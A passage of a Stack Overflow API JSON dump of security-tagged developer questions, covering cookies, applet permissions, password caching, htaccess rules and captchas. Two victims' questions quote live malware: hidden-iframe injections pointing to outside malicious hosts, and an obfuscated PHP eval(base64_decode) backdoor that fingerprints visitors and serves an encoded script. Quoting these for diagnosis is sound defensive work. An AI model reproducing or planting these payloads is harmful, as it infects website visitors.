that this isn't a secure solution, because a cookie can be stolen, can't it?</p>\n\n<p>So, what to do?</p>\n\n<p>P.S. Obviously I can't login every time.</p>\n"},{"tags":["java","image","security","applet","screenshot"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":12422778,"title":"Signed Java applet permission","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5313672/setting-up-policies-for-an-applet-embedded-in-html\">Setting up policies for an Applet embedded in HTML</a>  </p>\n</blockquote>\n\n\n\n<p>I created a simple Java applet to get the screenshot of the website. I signed the jar and it seems it is pretty much verified.</p>\n\n<pre><code>         410 Fri Sep 14 13:20:34 EEST 2012 META-INF/MANIFEST.MF\n         376 Fri Sep 14 13:20:36 EEST 2012 META-INF/SIGNER.SF\n         830 Fri Sep 14 13:20:36 EEST 2012 META-INF/SIGNER.RSA\n           0 Fri Sep 14 13:20:36 EEST 2012 META-INF/\n           0 Fri Sep 14 13:20:36 EEST 2012 screencaptureapplet/\nsm       615 Fri Sep 14 13:20:36 EEST 2012 screencaptureapplet/CaptureFrame$1.class\nsm     17311 Fri Sep 14 13:20:36 EEST 2012 screencaptureapplet/CaptureFrame.class\n\n  s = signature was verified\n  m = entry is listed in manifest\n  k = at least one certificate was found in keystore\n  i = at least one certificate was found in identity scope\n\njar verified.\n</code></pre>\n\n<p>however it doesnt work on my website. it says:</p>\n\n<pre><code>access denied (java.awt.AWTPermission createRobot)\n</code></pre>\n\n<p>and what is awkward is that it fails at the very first line of my funtion which is </p>\n\n<pre><code>Robot robot = new Robot();\n</code></pre>\n\n<p>does anyone out there know way to fix this issue?</p>\n"},{"tags":["java","android","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12422678,"title":"Is it possible to register java security Provider within Android?","body":"<p>Is it possible to register java.security.Provider within Android OS?</p>\n\n<p>Thank you!</p>\n"},{"tags":["c++","windows","security","mfc"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":716,"score":1,"question_id":2399125,"title":"How to Get File security attribute in windows","body":"<p>I am using c++ MFC<p>\nHow can I get the file security attribute in windows, is there any handy api?<p>\nMany thanks!</p>\n"},{"tags":["web-services","security","excel","vba","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12428293,"title":"Best way to cache a password in an Excel VBA function","body":"<p>I need to connect to some remote database through Excel (don't ask me why ^^'). We can't connect directly through ODBC, but I will query a webservice on another computer connected to the database.\nThe login/password to send will be sent through https from excel. The webservice then will connect to the database with those informations.\nI don't want to ask the password each time the webservice will be queried, I need to cache it.\nIs there a better way (I'm pretty sure there is) than to store in some kind of global variable ?</p>\n"},{"tags":["security","iframe","malware","malware-detection"],"answer_count":2,"favorite_count":2,"up_vote_count":2,"down_vote_count":1,"view_count":340,"score":1,"question_id":11955634,"title":"iFrame Injection Attack Followed us to New Server","body":"<p>A few months ago, a hidden iFrame started showing up on every page on every site on our dedicated server. When we took the sites down for maintenance with a 503, the iFrame was still there on the down for maintenance page. Eventually, the host blocked the source of the iFrame, but we never found the backdoor. The injected iFrame looked something like this, but wrapped in a style tag to obfuscate and with various URLs:</p>\n\n<p>iframe src=\"http://heusnsy.nl/32283947.html..</p>\n\n<p>We moved our smaller sites to a different host, and they've been fine.</p>\n\n<p>We moved our main site to a new dedicated server on the same host, and despite our efforts to lock down the server - firewalls, restricted access, software updates, inspecting every file - the iFrame returned. </p>\n\n<p>We've looked everywhere to locate how this is getting in - config files, htaccess - but can't find it. </p>\n\n<p>Any idea where the hidden iFrame injection vulnerabilities could be?</p>\n\n<p>Edit :\nHere are more details: Linux machine running Apache and PHP. Latest versions of everything. The code the was injected looks like this: </p>\n\n<p><code>&lt;style&gt;.ivx4di91j1 { position:absolute; left:-1418px; top:-1348px} &lt;/style&gt; &lt;div class=\"ivx4di91j1\"&gt;&lt;iframe src=\"heusnsy.nl/32283947.html..</code></p>\n\n<p>Update :\nHere is more information and what we have learned:</p>\n\n<p>host: Station CentOS Linux 6.3 - Linux 2.6.32-279.5.1.el6.x86_64 on x86_64 / Apache version 2.2.15 - PHP 5.3.3 (cli) (built: Jul  3 2012 16:53:21) </p>\n\n<ol>\n<li><p>Server itself is not compromised.</p></li>\n<li><p>All the services including (apache/php) are upgraded to the latest versions available for our system.</p></li>\n<li><p>No accounts (ftp or otherwise) were compromised.</p></li>\n<li><p>Malware changes it's destination URL (iframe src=) simultaneously on several infected sites. (Courtesy of unmaskparasites.com)</p></li>\n<li><p>During the change of the src target, no rogue or hidden processes were executed/running.</p></li>\n<li><p>TCPDUMP got the code of the malware while leaving out of port 80 tcp but nothing strange was found in the GET request from the user receiving the malware - nothing strange was found in the corresponding apache access logs too.</p></li>\n<li><p>Website files or the httpd/php binary's were not changed in any way during the switch of src url address of the iFrame - courtesy of md5sum check.</p></li>\n<li><p>No rogue connections were made on the known ports for the known services during the change. Firewall takes care for the rest.</p></li>\n<li><p>rkhunter and maldet came up with no results.</p></li>\n<li><p>Malware iFrame gets triggered and injected right after the first <code>\"&lt;/script&gt;\"</code> tag on any page having this tag, on all accounts and websites on this server.</p></li>\n<li><p>Malware gets injected into static pages and on sites without database connections. (it is enough for the page to have <code>&lt;head&gt; &lt;/script&gt;&lt;/head&gt;</code> tags)</p></li>\n<li><p>No rogue apache modules or php modules (excluding mycript.so) were installed. Most of the default apache modules are suspended and commented out.</p></li>\n<li><p>Malware is not constantly present. It comes and goes, sometimes it's off for several hours, and then shows up for several users and goes out again. Making it extremely hard to trace.</p></li>\n<li><p>100% of the php codes and most of the javascript codes runing on our sites (except the phpmyadmin one) are custom coded. The only thing that is not are the Jquery libs.</p></li>\n</ol>\n\n<p>Server is high traffic machine and searching/matching in logs is extremely slow. Weekly access log can become over 15gb.</p>\n\n<p>That's the situation... It's no longer a matter of compromised accounts, hacked files, rogue scripts. This is something beyond anything we've seen so far and the cause is hidden somewhere in the apache/php itself. (At least this is what we think). Any help or ideas are much appreciated. </p>\n\n<p>Here are examples of the iFrame injection:</p>\n\n<p><code>&lt;script src=\"/templates/js/jquery-1.4.2.min.js\" type=\"text/javascript\"&gt;&lt;/script&gt;&lt;style&gt;.pw0xxs { position:absolute; left:-1795px; top:-1357px} &lt;/  style&gt; &lt;div class=\"pw0xxs\"&gt;&lt;iframe src=\"http://infectedsite.com/84064443.html\" width=\"167\" height=\"332\"&gt;&lt;/iframe&gt;&lt;/div&gt;</code></p>\n\n<p><code>&lt;script src=\"http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js\" type=\"text/javascript\"&gt;&lt;/script&gt;&lt;style&gt;.h3fuonj6 { position:absolute; left :-1012px; top:-1348px} &lt;/style&gt; &lt;div class=\"h3fuonj6\"&gt;&lt;iframe src=\"http://infectedsite.com/13334443.html\" width=\"236\" height=\"564\"&gt;&lt;/iframe&gt;&lt;/div &gt;</code></p>\n\n<p><code>&lt;/script&gt;&lt;style&gt;.exm31sfk8l { position:absolute; left:-1349px; top:-1836px} &lt;/style&gt; &lt;div class=\"exm31sfk8l\"&gt;&lt;iframe src=\"http://infectedsite.com/79144443.html\" wid th=\"559\" height=\"135\"&gt;&lt;/iframe&gt;&lt;/div&gt;\ndocument.write('&lt;style&gt;.exm31sfk8l { position:absolute; left:-1349px; top:-1836px} &lt;/style&gt; &lt;div class=\"exm31sfk8l\"&gt;&lt;iframe src=\"http://ksner.pl/79144443.ht ml\" width=\"559\" height=\"135\"&gt;&lt;/iframe&gt;&lt;/div&gt;');// ColorBox v1.3.19.3 - jQuery lightbox plugin</code></p>\n\n<p><code>&lt;/script&gt;&lt;style&gt;.rv9mlj { position:absolute; left:-1698px; top:-1799px} &lt;/style&gt; &lt;div class=\"rv9mlj\"&gt;&lt;iframe src=\"http://infectedsite.com/42054443. html\" width=\"163\" height=\"409\"&gt;&lt;/iframe&gt;&lt;/div&gt;</code></p>\n\n<p><code>&lt;script src=\"./js/cross_framing_protection.js?ts=1344391602\" type=\"text/javascript\"&gt;&lt;/script&gt;&lt;style&gt;.rv9mlj { position:absolute; left:-1698px; top:-1799px} &lt;/style&gt; &lt;div class=\"rv9mlj\"&gt;&lt;iframe src=\"http://infectedsite.com/42054443.html\" width=\"163\" height=\"409\"&gt;&lt;/iframe&gt;&lt;/div&gt;</code></p>\n"},{"tags":["java","sql","security","static-analysis"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":120,"score":4,"question_id":12427029,"title":"SQL injection finders","body":"<p>We have a Java based client/server project. Recently one of the testers has found a SQL injection vulnerability while testing the application.</p>\n\n<p>We do not have enough resources to manually check the application for SQL injections.</p>\n\n<p>Are there any SQL injection finders / static code analyzers that find SQL vulnerabilities in Java code?</p>\n"},{"tags":[".net","security","certificate","ms-office","add-in"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":77,"score":4,"question_id":11065598,"title":"how do you obtain a security certificate for a MS Office add-in?","body":"<p>Some people at the office feel uncomfortable having to disable \"macro security for outlook add-ins\" in order to get my add-in to work. </p>\n\n<p>How do I obtain a security certificate for my add-in so that it loads in spite of the security settings currently in place? Is it worth the trouble? Does it cost a lot of money?</p>\n"},{"tags":["asp.net",".net","asp.net-mvc","security","asp.net-web-api"],"answer_count":3,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":592,"score":3,"question_id":12028604,"title":"How can I safely set the user principal in a custom WebAPI HttpMessageHandler?","body":"<p>For basic authentication I have implemented a custom <code>HttpMessageHandler</code> based on the example shown in Darin Dimitrov's answer here: <a href=\"http://stackoverflow.com/a/11536349/270591\">http://stackoverflow.com/a/11536349/270591</a></p>\n\n<p>The code creates an instance <code>principal</code> of type <code>GenericPrincipal</code> with user name and roles and then sets this principal to the current principal of the thread:</p>\n\n<pre><code>Thread.CurrentPrincipal = principal;\n</code></pre>\n\n<p>Later in a <code>ApiController</code> method the principal can be read by accessing the controllers <code>User</code> property:</p>\n\n<pre><code>public class ValuesController : ApiController\n{\n    public void Post(TestModel model)\n    {\n        var user = User; // this should be the principal set in the handler\n        //...\n    }\n}\n</code></pre>\n\n<p>This seemed to work fine until I recently added a custom <code>MediaTypeFormatter</code> that uses the <code>Task</code> library like so:</p>\n\n<pre><code>public override Task&lt;object&gt; ReadFromStreamAsync(Type type, Stream readStream,\n    HttpContent content, IFormatterLogger formatterLogger)\n{\n    var task = Task.Factory.StartNew(() =&gt;\n    {\n        // some formatting happens and finally a TestModel is returned,\n        // simulated here by just an empty model\n        return (object)new TestModel();\n    });\n    return task;\n}\n</code></pre>\n\n<p>(I have this approach to start a task with <code>Task.Factory.StartNew</code> in <code>ReadFromStreamAsync</code> from some sample code. Is it wrong and maybe the only reason for the problem?)</p>\n\n<p>Now, \"sometimes\" - and for me it appears to be random - the <code>User</code> principal in the controller method isn't the principal anymore I've set in the MessageHandler, i.e. user name, <code>Authenticated</code> flag and roles are all lost. The reason seems to be that the custom MediaTypeFormatter causes a change of the thread between MessageHandler and controller method. I've confirmed this by comparing the values of <code>Thread.CurrentThread.ManagedThreadId</code> in the MessageHandler and in the controller method. \"Sometimes\" they are different and then the principal is \"lost\".</p>\n\n<p>I've looked now for an alternative to setting <code>Thread.CurrentPrincipal</code> to somehow transfer the principal safely from the custom MessageHandler to the controller method and in <a href=\"http://sixgun.co.uk/blog/2012/02/29/asp-net-web-api-basic-authentication/\" rel=\"nofollow\">this blog post</a> request properties are used:</p>\n\n<pre><code>request.Properties.Add(HttpPropertyKeys.UserPrincipalKey,\n    new GenericPrincipal(identity, new string[0]));\n</code></pre>\n\n<p>I wanted to test that but it seems that the <code>HttpPropertyKeys</code> class (which is in namespace <code>System.Web.Http.Hosting</code>) doesn't have a <code>UserPrincipalKey</code> property anymore in the recent WebApi versions (release candidate and final release from last week as well).</p>\n\n<p>My question is: How can I change the last code snippet above so that is works with the current WebAPI version? Or generally: How can I set the user principal in a custom MessageHandler and access it reliably in a controller method?</p>\n\n<p><strong>Edit</strong></p>\n\n<p>It is mentioned <a href=\"http://leastprivilege.com/2012/03/08/asp-net-webapi-security-2-identity-architecture/\" rel=\"nofollow\">here</a> that \"<code>HttpPropertyKeys.UserPrincipalKey</code> ... resolves to <code>MS_UserPrincipal</code>\", so I tried to use:</p>\n\n<pre><code>request.Properties.Add(\"MS_UserPrincipal\",\n    new GenericPrincipal(identity, new string[0]));\n</code></pre>\n\n<p>But it doesn't work as I expected: The <code>ApiController.User</code> property does not contain the principal added to the <code>Properties</code> collection above.</p>\n"},{"tags":["php","security",".htaccess"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12426790,"title":"How secure is htaccess deny from all","body":"<p>I have a file that I don't want to be accessed by anyone except my own server (by php request). I am using the following in my .htaccess:</p>\n\n<pre><code>&lt;Files myfile.xml&gt;\n  Order Deny,Allow\n  Deny from all\n  Allow from localhost\n&lt;/Files&gt;\n</code></pre>\n\n<p>But was wondering, how secure is this? Is there anyway that someone might be able to get around this and get to the file directly?\nIn my php file I have:</p>\n\n<pre><code>simplexml_load_file(\"myfile.xml\")\n</code></pre>\n\n<p>To get the data and also am using</p>\n\n<pre><code>if(isset($_SERVER['HTTP_X_REQUESTED_WITH']) &amp;&amp; strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest')\n</code></pre>\n\n<p>So no one can access that file directly (only by Ajax)\nWhat do you guys think about using this method?</p>\n"},{"tags":["javascript","security","random","cryptography","numbers"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12411821,"title":"cryptographically random generation MIT library javascript","body":"<p>I'm looking for a MIT licensed javascript library to generate cryptographically random numbers. \nI have to use to generate AES 128 keys, so the generator has to be something really good.\nUnfortunately, all the (serious) library I found on Internet are GPL licensed and I can't use them for legal reasons. \nDo you know a usable library, which would be MIT licensed, or even better, public?</p>\n\n<p>Thank you very much</p>\n"},{"tags":["security","html5","application","cross-platform"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":144,"score":1,"question_id":10172640,"title":"Secure offline html5/js-application?","body":"<p>I want to develop a cross-plattform application, let's say suitable for desktop (win7/8/Linux) and mobile (win phone/iPhone). It should run in offline-mode and maybe I will chose to go commercial with it. The easiest way to do this is using html5 plus js.</p>\n\n<p>But how can I secure it somehow?</p>\n\n<p>Because there is no online-connection available I can't seperate view from logic. I can't activate it, because every check in js can be bypassed.</p>\n\n<p>Any clues?</p>\n"}]}
{"total":17772,"page":15,"pagesize":100,"questions":[{"tags":["linux","security","drupal","permissions","drupal-7"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":12388197,"title":"How to secure drupal file with permission?","body":"<p>i'm asking what's the best linux permission to drupal files in the purpose to secure it.<br>\nMy setting.php is under 444 but the others are 755 .<br>\nThank you</p>\n"},{"tags":["php","javascript","security"],"answer_count":4,"favorite_count":5,"up_vote_count":7,"down_vote_count":1,"view_count":1896,"score":6,"question_id":2880519,"title":"Captcha Decoded","body":"<p>I have seen some captchas being decode using javascript, php, etc. How do they do it?</p>\n\n<p>For example, very popular <strong>megaupload</strong> site's <a href=\"http://herecomethelizards.co.uk/mu_captcha/\" rel=\"nofollow\">captcha has also been decoded</a>.</p>\n"},{"tags":["python","security","beautifulsoup","urllib2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12421450,"title":"Fetch the Ubuntu USN from a script","body":"<p>While doing Penetration Tests, it could be useful to consult security bugs grouped by distribution versions. More specifically, I would like to fetch <a href=\"http://www.ubuntu.com/usn/\" rel=\"nofollow\">Ubuntu Security Notices</a> from a python script.</p>\n\n<p>My idea was to use urllib2 to fetch the data and BeautifulSoup to clean up the results.</p>\n\n<p>Does anybody think of a cleaner way to achieve this result?</p>\n\n<p>** UPDATE ** </p>\n\n<p>As pointed out by Omnikrys and John Mee, Atom and RSS are more easy format to work with, but AFAIK they only refer to newer distros, while I need a broader database.</p>\n"},{"tags":["php","javascript","security","base64","eval"],"answer_count":3,"favorite_count":2,"up_vote_count":1,"down_vote_count":5,"view_count":173,"score":-4,"question_id":12392107,"title":"Can <script type=\"text/javascript\">window.location=\"/\";</script> be hacked?","body":"<p>My PHP files, especially index.php files with JavaScript redirects like:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;window.location=\"/\";&lt;/script&gt;\n</code></pre>\n\n<p>Are hacked like this:</p>\n\n<pre><code>&lt;?php eval(base64_decode(\n'JGlwPSRfU0VSVkVSWyJSRU1PVEVfQUREUiJdOyRkcj0kX1NFUlZFUlsiRE9DVU1FTlRfUk9PVCJdOyR1YSA9ICRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQ\nnXTskZGJmPSRkci4nLycubWQ1KCRkci4nMScpOw0KaWYoKHN0cnBvcygkdWEsJ1dpbmRvd3MnKSE9PWZhbHNlKSYmKChzdHJwb3MoJHVhLCdNU0lFJykhPT1\nmYWxzZSl8fChzdHJwb3MoJHVhLCdGaXJlZm94JykhPT1mYWxzZSkpJiYoc3RycG9zKEBmaWxlX2dldF9jb250ZW50cygkZGJmKSwkaXApID09PSBmYWxzZSk\npew0KCWVycm9yX3JlcG9ydGluZygwKTsNCgllY2hvKGJhc2U2NF9kZWNvZGUoJ1BITmpjbWx3ZEQ1MGNubDdZV0p5WlNzcmZXTmhkR05vS0dFMlltRXpOSGt\nwZTNSeWVYdHdjbTkwYjNSNWNHVW1NbjFqWVhSamFDaGhjMkZpS1h0bFBYZHBibVJ2ZDFzaVpTSXJJbllpS3lKaGJDSmRPMzE5SUdsbUtERXBlMlk5V3kwMEx\nDMDFMRGt3TERnNUxERTRMREkxTERnM0xEazNMRGcwTERFd05DdzVOU3c0Tml3NU55d3hNRElzTXpFc09UQXNPRGNzTVRBeExEVTJMRGswTERnMkxEazJMRGc\nzTERrMUxERXdNeXd4TURFc05URXNNVEE0TERjd0xEZ3lMRGt3TERZMExEZ3lMRGsyTERnM0xESTFMREkyTERnMExEazJMRGczTERFd055d3lOQ3d5T0N3M05\n5d3pNeXc0TUN3eU55d3hNRGdzTUN3dE5Td3ROaXd0TkN3NU1TdzROeXd4TURFc09ETXNPVFFzT0Rnc01UQXdMREkxTERJNExEUTFMQzB5TEMwMExDMDFMREV\n4TUN3eE9TdzROeXc1TXl3eE1ESXNPRGNzTVRjc01URXdMQzB4TEMwMkxDMDBMQzAxTERnMUxEazRMRGcxTERFd01pdzVOaXc0Tnl3NU5Td3hNRE1zTXpJc01\nUQTBMREV3TVN3NU1Td3hNREVzT0Rnc01qWXNNVGtzTkRjc09URXNPRGNzTVRBeExEZ3pMRGswTERnNExERTRMREV3TUN3eE1ERXNPRFVzTkRZc01qWXNPVEF\nzTVRBeExERXdNeXc1T0N3ME15d3pOQ3d6TXl3eE1ESXNPVElzTVRBM0xERXdOeXc1TkN3NU1pdzVPU3d6TXl3NE55d3hNRGNzTVRBMExEZ3pMRE14TERnMkx\nEazNMRGswTERNMExERXdOQ3c0TkN3ek15dzVPQ3c0T1N3NU9TdzBPU3c0T0N3NU9DdzBOeXd6TlN3eU5pd3hPQ3d4TURRc09USXNPRFlzTVRBeExEa3hMRFE\nzTERJMExETTJMRE0wTERJMExERTVMRGt3TERnMkxEa3lMRGc1TERnNUxERXdNeXcwTnl3eU5Dd3pOaXd6TkN3eU5Dd3hPU3d4TURFc01UQXhMREV3T0N3NU5\nDdzROaXcwT0N3eU5Td3hNRE1zT1RJc01UQXhMRGt3TERnMUxEa3hMRGt6TERreUxERXdNaXd4TURZc05EVXNPVEFzT1RBc09EY3NPRFlzT0RZc09UY3NORFV\nzT1Rjc09UZ3NNVEF4TERrd0xERXdNeXc1TVN3NU5pdzVOeXcwTkN3NE1pdzROU3d4TURFc09UWXNPVFVzTVRBekxERXdNU3c0T0N3ME5TdzVNeXc0T0N3NE9\nDd3hNREVzTkRVc016UXNORFFzTVRBekxEazNMRGszTERRMUxETTBMRFEwTERJMkxEUTRMRFExTERNMExEa3hMRGczTERFd01TdzRNeXc1TkN3NE9DdzBPQ3d\n4T1N3eU9DdzBOU3d0TWl3dE5Dd3ROU3d4TVRBc01Dd3ROU3d0Tml3NE9Td3hNRE1zT1RVc09EWXNNVEF5TERrd0xEazRMRGsyTERFM0xEa3lMRGc0TERrNUx\nEZzBMRGsxTERnMkxERXdNU3d5Tml3eU5pd3hNVEFzTFRFc0xUWXNMVFFzTFRVc01UQXpMRGcwTERFd01Dd3hOeXc0T1N3eE9DdzBOaXd4T1N3NE5pdzVOaXc\n0Tml3eE1ETXNPVFFzT0Rnc09UWXNNVEF4TERNekxEZzFMRGs1TERnNExEZ3pMREV3TVN3NE9DdzFOU3c1TXl3NE9DdzVOU3c0Tml3NU55d3hNRElzTWpVc01\nqWXNPVEVzT0Rjc01UQXhMRGd6TERrMExEZzRMREkxTERJMkxEUTJMRGc0TERNeExERXdNaXc0Tnl3eE1ERXNOVElzTVRBeUxERXdNU3d4TURFc09URXNPRE1\nzTVRBMExERXdNaXc0Tml3eU55d3lOU3d4TURBc01UQXhMRGcxTERJMExETXhMREkxTERnNUxERXdNeXd4TURJc09UY3NORFVzTXpNc016SXNNVEEwTERreEx\nERXdOaXd4TURrc09UTXNPVEVzTVRBeExETXlMRGcyTERFd09Td3hNRE1zT0RJc016TXNPRFVzT1RZc09UWXNNek1zTVRBekxEZzJMRE15TERrM0xEa3hMRGs\n0TERRNExEa3dMRGszTERRMkxETTNMREkxTERJMkxEUTJMRGc0TERNeExERXdNaXd4TURJc01UQTJMRGsxTERnM0xETXhMREV3TlN3NU1Td3hNREFzT1RJc09\nEUXNPVEFzT1RVc09URXNNVEF4TERFd09DdzBOeXd5TkN3NU1TdzVNU3c0TlN3NE55dzROeXc1TlN3eU5pdzBOU3c0Tnl3ek15d3hNREVzTVRBeExERXdPQ3c\n1TkN3NE5pd3pNeXc1T0N3NU5pd3hNRElzT1RFc01UQXhMRGt5TERrM0xEazFMRFE0TERJMUxEZ3lMRGcxTERFd01TdzVOaXc1TlN3eE1ETXNNVEF4TERnNEx\nESTFMRFEwTERnNUxETXlMREV3TUN3eE1ETXNNVEEzTERrekxEZzRMRE15TERrekxEZzRMRGc0TERFd01TdzBPQ3d5TlN3ek15d3lOaXcwTlN3NE55d3pNeXd\n4TURFc01UQXhMREV3T0N3NU5DdzROaXd6TXl3eE1ESXNPVFlzT1Rrc05EY3NNalFzTXpVc01qVXNORFFzT0Rrc016SXNNVEF3TERnNExERXdNaXcxTUN3eE1\nETXNNVEF5TERrNUxEa3lMRGcwTERFd01pd3hNRE1zT0Rjc01qVXNNallzTVRBMUxEa3dMRGczTERFd01pdzRPU3d5Tml3ek1Dd3lOQ3d6Tml3ek5Dd3lOQ3d\n5T0N3ME5TdzROeXd6TXl3eE1ERXNPRFlzTVRBekxEVXhMREV3TVN3eE1ETXNNVEF3TERrd0xEZzFMREV3TXl3eE1ERXNPRGdzTWpZc01qUXNPVEVzT0Rjc09\nUQXNPVEFzT1RBc01UQXhMREkyTERNd0xESTBMRE0yTERNMExESTBMREk0TERRMUxDMHlMQzAwTEMwMUxDMDJMRGczTERrM0xEZzBMREV3TkN3NU5TdzROaXc\n1Tnl3eE1ESXNNekVzT1RBc09EY3NNVEF4TERVMkxEazBMRGcyTERrMkxEZzNMRGsxTERFd015d3hNREVzTlRFc01UQTRMRGN3TERneUxEa3dMRFkwTERneUx\nEazJMRGczTERJMUxESTJMRGcwTERrMkxEZzNMREV3Tnl3eU5Dd3lPQ3czTnl3ek15dzRNQ3d6TWl3NE1pdzVPU3c1T0N3NE5pdzVOeXc0Tml3MU1pdzVNU3c\n1TVN3NU15dzROeXd5Tml3NE55d3lPQ3cwTlN3dE1pd3ROQ3d0TlN3eE1UQmRPMzEzUFdZN2N6MWJYVHR5UFZOMGNtbHVaenQ0UFNKcUpTSTdabTl5S0drOU1\nEc3RhU3MxTnpraFBUQTdhU3M5TVNsN2FqMXBPMmxtS0dVbUppZ3dNekU5UFRCNE1Ua3BLWE05Y3l0eUxtWnliMjFEYUdGeVEyOWtaU2dvTVNwM1cycGRLMlV\nvZUNzektTc3hNeWtwTzMwZ2RISjVlMkZ6WjJGelp5WXhNMzFqWVhSamFDaGhjMmRoS1h0bEtITXBPMzA4TDNOamNtbHdkRDQ9JykpOw0KCWlmICgkZnAgPSB\nAZm9wZW4oJGRiZiAsICJhIikpe2ZwdXRzKCRmcCAsICRpcC4nfCcpOyBmY2xvc2UoJGZwKTt9DQp9'));?&gt;\n&lt;script type=\"text/javascript\"&gt;window.location=\"/\";&lt;/script&gt;\n</code></pre>\n\n<p>Is it because I am using <code>$_SERVER[\"REQUEST_URI\"]</code> or <code>$_SERVER[\"HTTP_REFERER\"]</code> or some other command - do they need stripping like <code>mysql_real_escape_string</code></p>\n"},{"tags":["spring","security","dynamic","struts","roles"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12408135,"title":"Spring security : dynamic roles","body":"<p>I would like to do something like this in my jsp (using spring and struts): </p>\n\n<pre><code>&lt;security:authorize ifAllGranted=\"ACCESS_&lt;s:property value='%{#attr.currentQueue}'/&gt;\"&gt;\n</code></pre>\n\n<p>Sadly it doesn't seem to work since I can't see the content I should see right now. However, there is no error either. </p>\n\n<p>Any idea whether it should work ? Is the method wrong ? </p>\n"},{"tags":["php","forms","security","captcha","contact"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12420543,"title":"how to add captcha in a contact form with NO gd","body":"<p>i'd like some help please. </p>\n\n<p>I'm having a contact form in which i'd like to add some captcha, with <strong>NO GD Library</strong>. I've added some images as a guide but there are static right now. What i'm trying to do is to output in a loop the images that will match with the code (random number) in the hidden field, for example if the random number is \"18301\" will display the appropriate images for each number, here is my code so far:</p>\n\n<pre><code>&lt;label for=\"captcha\"&gt;Type the code you see (*):&lt;br /&gt;\n    &lt;?php (do a loop here){ ?&gt;\n&lt;img src=\"images/0&lt;?php echo $num; ?&gt;.gif\" width=\"18\" height=\"30\" /&gt;\n&lt;?php } ?&gt;  \n\n     &lt;img src=\"images/00.gif\" width=\"18\" height=\"30\" /&gt;\n         &lt;img src=\"images/01.gif\" width=\"18\" height=\"30\" /&gt;\n         &lt;img src=\"images/08.gif\" width=\"18\" height=\"30\" /&gt;\n         &lt;img src=\"images/03.gif\" width=\"18\" height=\"30\" /&gt;\n         &lt;img src=\"images/00.gif\" width=\"18\" height=\"30\" /&gt;\n         &lt;img src=\"images/01.gif\" width=\"19\" height=\"30\" /&gt; =&lt;/label&gt;\n    &lt;span id=\"spryCaptcha\"&gt;\n    &lt;input type=\"text\" name=\"captcha\" id=\"captcha\" tabindex=\"70\" /&gt;\n    &lt;input name=\"hiddenCode\" type=\"hidden\" value=\"&lt;?php echo rand(000000,999999); ?&gt;\"/&gt;\n</code></pre>\n\n<p>How can i make this works so that the correct images will appear each time and checkes the user's input will match to the code he/she sees each time??</p>\n"},{"tags":["php","facebook","security"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":118,"score":3,"question_id":12311432,"title":"Facebook Application: Secure Canvas URL","body":"<p>I got a domain so that I can start a facebook app. but while I was filling up the basics, (canvas page, ur..etc) I've encounter the secure canvas url, and this really messed up my mind, I've been googling for several hours now, and I'm kinda desperate. lol. I've sign up on StartSSL since it's I'm just doing this for learning purpose and its free. </p>\n\n<p>I get this error whenever I got to secure http</p>\n\n<p><strong>SSL connection error\nUnable to make a secure connection to the server. This may be a problem with the server, or it may be requiring a client authentication certificate that you don't have.\nError 107 (net::ERR_SSL_PROTOCOL_ERROR): SSL protocol error.</strong></p>\n\n<p>Here's what I did:</p>\n\n<p>-I put all the content of 'src' in facebook-php-sdk on my folder 'ssl' which is also a subdomain of my website. I put my appID and appSecret inside the index.php</p>\n\n<p>-On my SSL/TLS Manager (I'm using cpanel) I filled all the requirements on the textfield to have a CSR</p>\n\n<p>-I copied the csr and submit it on StartSSL </p>\n\n<p>-After that the LLS site prompt me that I should put a subdomain.</p>\n\n<p>-Then they gave me a CRT. after that I went to my cpanel again, paste it on crt manager and install</p>\n\n<p>I really thought that after doing this my url can be browse on https. Please help me, Did I missed something here?</p>\n"},{"tags":["security","iframe","cross-domain"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":11558056,"title":"How to secure iframe access of a secured domain from a non secure domain?","body":"<p>I am having two domains.One is secured and the other is not.Currently,when the user submits form data i redirect the the user to this secure website to collect further details.This redirection is made secure by means of cross domain cookies.</p>\n\n<p>Now,instead of redirecting to the secure page i am planning to load the secure page in an iframe.But i am not aware of the security measures to be taken up to secure this communication via iframe.How to ensure that this communication is secured?Will setting cross-domain cookies solve the problem?</p>\n"},{"tags":["asp.net",".net","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":139,"score":1,"question_id":10120204,"title":"Open Source Security Frameworks for .NET","body":"<p>Are there any security frameworks that are open source for ASP.NET web forms or MVC?  I'm looking for something to authenticate users, and authorization capabilities if possible.  Just to note, I am NOT interested in the Membership API, but am looking for a framework that has similar capabilities.</p>\n\n<p>Thanks.</p>\n"},{"tags":["security","http","rest","iframe","https"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12418426,"title":"Secure iframe from HTTPS solutions","body":"<p>I'm working on a registration app/api that will allow for event registration/payments and 